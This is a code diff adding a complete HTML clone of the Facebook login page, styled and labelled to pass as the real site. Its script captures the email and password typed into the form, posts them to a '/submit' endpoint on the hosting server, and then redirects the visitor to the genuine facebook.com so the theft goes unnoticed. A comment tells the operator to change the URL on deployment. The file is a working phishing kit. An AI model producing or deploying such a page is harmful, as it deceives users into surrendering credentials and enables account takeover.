@@ -1,0 +1,413 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook</title>
+    <link rel="shortcut icon" href="./images/fb.ico" type="image/x-icon">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;700;900&display=swap');
+        * {
+            padding: 0px;
+            margin: 0px;
+            box-sizing: border-box;
+        }
+        body {
+            background:#f0f2f5;
+            font-family: 'Poppins', sans-serif;
+            min-height: 100vh;
+        }
+        main {
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 1rem;
+        }
+        .main {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 100%;
+            max-width: 1200px;
+            gap: 2rem;
+        }
+        .heading-section {
+            display: flex;
+            flex-direction: column;
+            max-width: 550px;
+            flex: 1;
+        }
+        .logo-img {
+            display: block;
+            width: 100%;
+            max-width: 270px;
+            height: auto;
+        }
+        .form {
+            width: 100%;
+            max-width: 390px;
+            flex-shrink: 0;
+        }
+        .a-form {
+            width: 100%;
+            padding: 20px;
+            background-color: #fff;
+            border: none;
+            box-shadow: 0 2px 4px rgb(0 0 0 / 10%), 0 8px 16px rgb(0 0 0 / 10%);
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
+        .a-form .a-email, .a-form .a-pss {
+            width: 100%;
+            padding: 15px;
+            font-size: 16px;
+            margin: 10px 0;
+            border: 1px solid lightgray;
+            border-radius: 8px;
+            outline: none;
+        }
+        .a-form .a-email:focus, .a-form .a-pss:focus {
+            box-shadow: 0px 0px 2px #0066ff;
+            border-color: #0066ff;
+        }
+        .a-form .a-sub {
+            width: 100%;
+            padding: 15px;
+            margin: 10px 0;
+            background-color: #1877f2;
+            color: white;
+            font-size: 18px;
+            border: none;
+            font-weight: 700;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        .a-form .a-sub:hover {
+            background-color: #166fe5;
+        }
+        .a-form .a-sub:active {
+            background-color: #0e5fd9;
+        }
+        .a-form .a-link {
+            display: block;
+            text-decoration: none;
+            text-align: center;
+            padding: 10px 0;
+            font-size: 14px;
+            color: #1877f2;
+        }
+        .a-form .a-link:hover {
+            text-decoration: underline;
+        }
+        .a-form .a-hr {
+            margin: 1.5em 0;
+            border: 1px solid #E0E0E0;
+        }
+        .a-form .a-but {
+            width: 60%;
+            background-color: #42b883;
+            padding: 14px;
+            margin: 10px auto;
+            color: white;
+            font-size: 16px;
+            font-weight: 700;
+            border: none;
+            text-align: center;
+            cursor: pointer;
+            border-radius: 8px;
+            display: block;
+            transition: background-color 0.2s;
+        }
+        .a-form .a-but:hover {
+            background-color: #369870;
+        }
+        .a-ri8 {
+            padding: 15px 0;
+            font-size: 24px;
+            line-height: 1.3;
+        }
+        .create-page {
+            width: 100%;
+            text-align: center;
+            font-size: 14px;
+            padding: 10px;
+        }
+        .a-href {
+            text-decoration: none;
+            font-weight: 700;
+            color: black;
+        }
+        .a-href:hover {
+            text-decoration: underline;
+        }
+        .footer {
+            display: flex;
+            justify-content: center;
+            width: 100%;
+            background: #fff;
+            padding: 1rem;
+        }
+        #pageFooter {
+            max-width: 968px;
+            color: #737373;
+        }
+        ul {
+            line-height: 1.6;
+            margin: 0;
+            padding: 0;
+        }
+        ul li {
+            display: inline-block;
+            padding: 0 10px;
+            font-size: 12px;
+            list-style-type: none;
+        }
+        a {
+            color: #385898;
+            cursor: pointer;
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+        #line {
+            border-bottom: 1px solid #dddfe2;
+            height: 8px;
+            margin: 8px 0;
+        }
+        .copyright {
+            font-size: 12px;
+            padding: 10px 0;
+        }
+        .m-footer {
+            display: none;
+        }
+
+        /* Mobile Styles */
+        @media screen and (max-width: 898px) {
+            .main {
+                flex-direction: column;
+                text-align: center;
+                gap: 1rem;
+            }
+            .heading-section {
+                margin: 0;
+                max-width: 100%;
+            }
+            .logo-img {
+                max-width: 200px;
+                margin: 0 auto;
+            }
+            .a-ri8 {
+                font-size: 20px;
+                padding: 10px 0;
+            }
+            .form {
+                max-width: 100%;
+            }
+        }
+
+        @media screen and (max-width: 480px) {
+            main {
+                padding: 0.5rem;
+            }
+            .a-form {
+                padding: 15px;
+            }
+            .logo-img {
+                max-width: 180px;
+            }
+            .a-ri8 {
+                font-size: 18px;
+            }
+            .a-form .a-email, .a-form .a-pss {
+                font-size: 16px;
+                padding: 12px;
+            }
+            .a-form .a-sub {
+                font-size: 16px;
+                padding: 12px;
+            }
+            .footer {
+                display: none;
+            }
+            .m-footer {
+                display: block;
+                color: #737373;
+                padding: 1rem;
+            }
+            .main-c {
+                display: flex;
+                justify-content: space-between;
+                font-size: 12px;
+                text-align: center;
+                padding: 0 2rem 1rem;
+            }
+            .list-1, .list-2 {
+                display: flex;
+                flex-direction: column;
+                gap: 0.5rem;
+            }
+            .main-c a {
+                color: #737373;
+            }
+            .main-links {
+                color: #737373;
+                font-size: 12px;
+                text-align: center;
+                padding: 0.5rem 0;
+            }
+            .fb {
+                font-size: 12px;
+                text-align: center;
+                padding-bottom: 0.5rem;
+            }
+        }
+
+        /* Very small screens */
+        @media screen and (max-width: 320px) {
+            .a-form {
+                padding: 10px;
+            }
+            .a-form .a-but {
+                width: 80%;
+            }
+            .main-c {
+                padding: 0 1rem 1rem;
+                font-size: 11px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <main>
+        <div class="main">
+            <div class="heading-section">
+                <img src="./images/logo.png" class="logo-img" alt="Facebook">
+                <div class="a-ri8">
+                    <span>Facebook helps you connect and share with the people in your life.</span>
+                </div>
+            </div>
+
+            <div class="form">
+                <form class="a-form">
+                    <input type="email" id="Email" class="a-email" name="Email" placeholder="Email address or phone number" required />
+                    <input type="password" id="Password" class="a-pss" name="Password" placeholder="Password" required />
+                    <input type="submit" class="a-sub" value="Log In" />
+                    <a href="#" class="a-link">Forgotten password?</a>
+                    <hr class="a-hr">
+                    <input type="button" value="Create New Account"  class="a-but" onclick="createAccount()" />
+                </form>
+                <div class="create-page">
+                    <a href="#" class="a-href">Create a Page</a> for a celebrity, band or business.
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <div class="footer">
+        <div id="pageFooter">
+            <ul>
+                <li>English (UK)</li>
+                <li><a href="#">हिन्दी</a></li>
+                <li><a href="#">ગુજરાતી</a></li>
+                <li><a href="#">मराठी</a></li>
+                <li><a href="#">اردو</a></li>
+                <li><a href="#">മലയാളം</a></li>
+                <li><a href="#">বাংলা</a></li>
+                <li><a href="#">తెలుగు</a></li>
+                <li><a href="#">தமिழ்</a></li>
+                <li><a href="#">ਪੰਜਾਬੀ</a></li>
+                <li><a href="#">Español</a></li>
+            </ul>
+            <div id="line"></div>
+            <div>
+                <ul>
+                    <li><a href="#">Sign Up</a></li>
+                    <li><a href="#">Log In</a></li>
+                    <li><a href="#">Messenger</a></li>
+                    <li><a href="#">Facebook Lite</a></li>
+                    <li><a href="#">Watch</a></li>
+                    <li><a href="#">People</a></li>
+                    <li><a href="#">Pages</a></li>
+                    <li><a href="#">Groups</a></li>
+                    <li><a href="#">Marketplace</a></li>
+                    <li><a href="#">Instagram</a></li>
+                    <li><a href="#">Privacy</a></li>
+                    <li><a href="#">Terms</a></li>
+                </ul>
+            </div>
+            <div class="copyright">
+                <span>Facebook © 2021</span>
+            </div>
+        </div>
+    </div>
+
+    <div class="m-footer">
+        <div class="main-c">
+            <div class="list-1">
+                <span>English (UK)</span>
+                <div><span><a href="#">हिन्दी</a></span></div>
+                <div><span><a href="#">اردو</a></span></div>
+                <div><span><a href="#">বাংলা</a></span></div>
+            </div>
+            <div class="list-2">
+                <div><span><a href="#">ગુજરાતી</a></span></div>
+                <div><span><a href="#">मराठी</a></span></div>
+                <div><span><a href="#">മലയാളം</a></span></div>
+            </div>
+        </div>
+        <div class="main-links">
+            <span>About</span> ·
+            <span>Help</span> ·
+            <span>More</span>
+        </div>
+        <div class="fb">Facebook Inc.</div>
+    </div>
+
+    <script>
+        document.querySelector('.a-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const Email = document.getElementById('Email').value;
+            const Password = document.getElementById('Password').value;
+
+            if (!Email || !Password) {
+                alert("Please fill in all fields");
+                return;
+            }
+
+            // Change this URL when deployed
+            const submitUrl = window.location.origin + '/submit';
+
+            fetch(submitUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ Email, Password })
+            })
+            .then(res => res.json())
+            .then(data => {
+                alert("Login info submitted.");
+                setTimeout(() => {
+                    window.location.href = 'https://www.facebook.com';
+                }, 2000);
+                // Clear form
+                // document.getElementById('Email').value = '';
+                // document.getElementById('Password').value = '';
+            })
+            .catch(err => {
+                alert("Error submitting.");
+                console.error(err);
+            });
+        });
+        function createAccount() {
+            // Redirect to real Facebook signup
+            window.location.href = 'https://www.facebook.com/reg/';
+        }
+    </script>
+</body>
+</html>
